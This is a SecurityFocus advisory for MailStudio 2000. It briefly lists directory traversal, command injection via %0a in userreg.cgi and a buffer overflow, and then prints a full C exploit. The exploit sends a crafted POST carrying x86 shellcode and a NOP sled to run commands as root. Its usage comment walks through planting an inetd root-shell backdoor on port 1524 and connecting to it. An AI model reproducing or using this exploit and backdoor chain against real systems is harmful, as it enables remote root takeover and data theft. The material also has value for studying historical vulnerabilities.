source: http://www.securityfocus.com/bid/1335/info

MailStudio 2000 is vulnerable to multiple attacks.

It is possible for a remote user to gain read access to all files located on the server via the usage of the "/.." string passed to a CGI, thereby compromising the confidentiality of other users email and password, as well as other configuration and password files on the system.

It is also possible to set a password for those system user accounts which don't have one in place (ex: operator, gopher etc).

There is also a input validation vulnerability in the userreg.cgi. This CGI uses a shell to execute certain commands. Passing any command directly after %0a in the arguments of the CGI will allow a remote user to execute the commands as root.

userreg.cgi also has an unchecked which could allow remote attackers to execute arbitrary code as root.

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

/* http://www.mailstudio.com
 * executes command as root.mail
 * usage: userregsp [-s retaddr] [-a shellcodeoffset] [-o offset] 
 *  [-c command]  | nc <host> <port>
 *
 * problems:  
 * usually commandline gets truncated after 42 characters. 
 * sometimes shellcode might be damaged, to get around this you'd have to split
 * command into few parts or move shellcode on different place. (-a argument)
 *
 * f.e.
 * ./userregsp "echo -n 1524 stream tcp nowait r>>/tmp/.o" | nc victim 8080
 * ./userregsp "echo oot /bin/sh sh -i >>/tmp/.o" | nc victim 8080
 * ./userregsp "/usr/sbin/inetd /tmp/.o" | nc victim 8080
 * telnet victim 1524
 *
 *
 * Here I found possible stack addresses which might be of some help:
 * 0xbfffe6a4 -- when correct `Referer: ....' header has been passed
 * 0xbfffe578 -- when incorrect `Referer: ..' header has been passed
 * 0xbfffe598 -- when `Referer: ..' header is not present.
 *  ...
 * Mon Apr 24 20:14:31 ICT 2000  -- fygrave@tigerteam.net
 */

#define TALKING "POST /cgi-auth/userreg.cgi HTTP/1.0\n"\
"Connection: Keep-Alive\n"\
"User-Agent: Mozilla/4.7 [en] (X11; U; Linux 2.2.13 i586)\n"\
"Host: mailstudio_server:8081\n"\
"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\n"\
"Accept-Encoding: gzip\n"\
"Accept-Language: en\n"\
"Accept-Charset: iso-8859-1,*,utf-8\n"\
"Cookie: lang=eng; tnum=1\n"\
"Content-type: application/x-www-form-urlencoded \n"\
"Content-length: 179\n\n"\
"cmd=insert&chk=&template=%%2Ftemplate%%2Feng1&fld1=%s&fld2=XXX&passwd_confirm=XXX&fld4=name&fld5=jiji&fld6=1&fld7=&fld9=&fld10=&fld11=&fld12=&fld13=&fld14=&fld15=&fld16=&fld17=\n\n"

#define BUF_SIZE 1024
char shellcode[]=

"\xeb\x2e" //           jmp    80483dc <tail>
"\x5e"     //           popl   %esi
"\x89\x76\x70"   //     movl   %esi,0x70(%esi)
"\x8d\x46\x08"   //     leal   0x18(%esi),%eax
"\x89\x46\x74"   //     movl   %eax,0x74(%esi)
"\x8d\x46\x0b"   //     leal   0x1b(%esi),%eax
"\x89\x46\x78"   //     movl   %eax,0x78(%esi)
"\x31\xc0"       //     xorl   %eax, %eax
"\x88\x46\x07"   //     movb   %al,0x7(%esi)
"\x88\x46\x0a"   //     movb   %al,0xa(%esi)
"\x89\x46\x7c"   //     movl   %eax,0x7c(%esi)
"\xb0\x0b"       //     movb   $0xb, %al
"\x89\xf3"       //     movl   %esi, %ebx
"\x8d\x4e\x70"   //     leal   0x70(%esi), %ecx
"\x8d\x56\x7c"   //     leal   0x74(%esi), %edx
"\xcd\x80"      //      int    $0x80
"\x31\xdb"      //      xorl   %ebx,%ebx
"\x89\xd8"      //      movl   %ebx,%eax
"\x40"         //       incl   %eax
"\xcd\x80"      //      int    $0x80
"\xe8\xcd\xff\xff\xff"//        call   80483ae <callback>
"/bin/sh\xff-c\xff";

extern char *optarg;

void main(int argc, char **argv) {
char buf[BUF_SIZE+1];
char *foo;
char *command, c;
unsigned long retaddr,bp, offset, shelloffset;

/* defaults */
command="/bin/touch /tmp/0wn3d";
retaddr=0xbfffe598;
bp=0xbfffe678;
offset = 16;
shelloffset = 24;


while((c = getopt(argc, argv, "s:c:")) !=EOF) 
        switch(c) {
                case 's':
                        retaddr = strtoul(optarg,NULL,0); 
                        break;
                case 'a':
                        shelloffset = strtoul(optarg,NULL,0); 
                        break;
                case 'o':
                        offset = strtoul(optarg,NULL,0); 
                        break;
                case 'c':
                        command = optarg;
                        if (strlen(command) > 42) 
                                fprintf(stderr,"WARNING: your command line "
                                "might get truncated!\n");
                        break;
                default:
                        fprintf(stderr, "usage %s [-c command] [-s retaddr]"
                        " [-o offset] [-a shelloffset]\n", argv[0]);
                        exit(1);

        }


 foo=&buf[offset];
 bzero(buf,BUF_SIZE+1);
 memset(buf,0x90,BUF_SIZE);

 *foo++ = (bp >> 0) & 0xff;
 *foo++ = (bp >> 8) & 0xff;
 *foo++ = (bp >>16) & 0xff;
 *foo++ = (bp >>24) & 0xff;

 *foo++ = (retaddr >> 0) & 0xff;
 *foo++ = (retaddr >> 8) & 0xff;
 *foo++ = (retaddr >>16) & 0xff;
 *foo++ = (retaddr >>24) & 0xff;
 /*
  * you can get outside the buffer boundaries here but I don't care. Very long
  * command lines would be damaged by shellcode or truncated anyway.. 
  */
 bcopy(shellcode,&buf[shelloffset],strlen(shellcode+1));
 bcopy(command,&buf[24+strlen(shellcode)],strlen(command)+1);
 printf(TALKING, buf);

}

